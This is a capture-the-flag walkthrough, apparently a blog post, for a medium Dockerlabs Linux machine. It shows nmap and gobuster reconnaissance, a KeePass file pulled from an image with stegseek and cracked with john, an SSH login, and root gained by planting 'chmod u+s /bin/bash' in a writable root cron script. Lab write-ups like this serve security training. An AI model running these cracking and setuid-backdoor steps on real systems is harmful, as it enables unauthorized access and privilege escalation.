---
date: 2024-09-21
categories: [Linux, Medium]
---

![dockerlabs](https://github.com/user-attachments/assets/b3d3aade-08ea-4beb-8df9-716546c86b98)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [El pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)         | [Dockerlabs](https://dockerlabs.es/)     | Medium           | Linux   |

---









- I start with a scan of the open ports
  
  ```bash
  nmap -p- -vvv --min-rate 5000 -Pn -sS 172.17.0.2 -oG scan
  ```
  
  ![Untitled](https://github.com/user-attachments/assets/0aec04f2-d4fa-4310-9341-d62b813bfcf9)


- Scanning open ports

  ```bash
  nmap -p22,80 -sCV 172.17.0.2 -oN ports
  ```
  
  ![Untitled 1](https://github.com/user-attachments/assets/6256a6a7-661a-4b7e-87e2-00da609dd990)


- I access to the website

  ![Untitled 2](https://github.com/user-attachments/assets/91e182c6-ebbc-4e77-91cf-6fcf2dc21741)


- I will perform fuzzing to try to find directories

  ```bash
  gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -t 300
  ```
  
  ![Untitled 3](https://github.com/user-attachments/assets/f67b67c6-a506-4931-8f29-d739d82d405c)


- Since I do not find anything relevant, I will perform fuzzing to find files

  ```bash
  gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -t 500 -x .php,.js,.txt,.html,.py,.sh
  ```
  
  ![Untitled 4](https://github.com/user-attachments/assets/6999b06a-f351-4cce-8feb-c3ace4cdb5b7)
  

- I access the website penguin.html

  ![Untitled 5](https://github.com/user-attachments/assets/10ca605a-6485-420b-8a52-42655c85500d)


- I download the image and look for hidden chains or files

  ```bash
  strings penguin.jpg
  stegseek penguin.jpg 
  ```
  
  ![Untitled 6](https://github.com/user-attachments/assets/64bf0fb6-11c4-45b6-b099-29da19948f10)


- I find a file with the extension kdbx. I change its name, I get its hash and I try to get its password

  ```bash
  mv  penguin.jpg.out  penguin.kdbx
  keepass2john penguin.kdbx > hash
  john --wordlist=/usr/share/wordlist/rockyou.txt hash
  ```
  
  ![Untitled 7](https://github.com/user-attachments/assets/6a7b8f9b-9e4a-4a03-add1-441ef0aebcb2)


- I use the password found to see the content of the file
  
  ![Untitled 8](https://github.com/user-attachments/assets/0192e806-efaa-4beb-b14f-5f4d0fcf37f1)


- I find a username and password. I tried to log in with ssh

  ![Untitled 9](https://github.com/user-attachments/assets/462d0684-c2dd-4105-a60c-7a6839fa4dd5)


- Once inside I find two files. I list the processes that are running on the system
  
  ```bash
  ps -aux
  ```
  
  ![Untitled 10](https://github.com/user-attachments/assets/457e32eb-4b9f-4f55-b6ce-986264e4fc20)
  
  
  ![Untitled 11](https://github.com/user-attachments/assets/3921830a-e229-47c1-8a11-45c3f964ec9e)
  
  
  ![Untitled 12](https://github.com/user-attachments/assets/5d3ac9a8-498f-4d30-8a8d-01dab8662dd9)


- I observe that the script is executed periodically and that I have write permission on it
- I add a command to be able to run as root
  
  ```bash
  nano script.sh
  
  chmod u+s /bin/bash
  ```
  
  ![Untitled 13](https://github.com/user-attachments/assets/b71d9e9c-d9f5-4884-8c05-2cd3888c3470)
  

- I see that the script has been executed and now I can spawn a terminal as root
  
  ```bash
  /bin/bash -p
  ```
  ![Untitled 14](https://github.com/user-attachments/assets/9f19662b-dc4c-42ce-ba98-2bdcfd1f5c84)
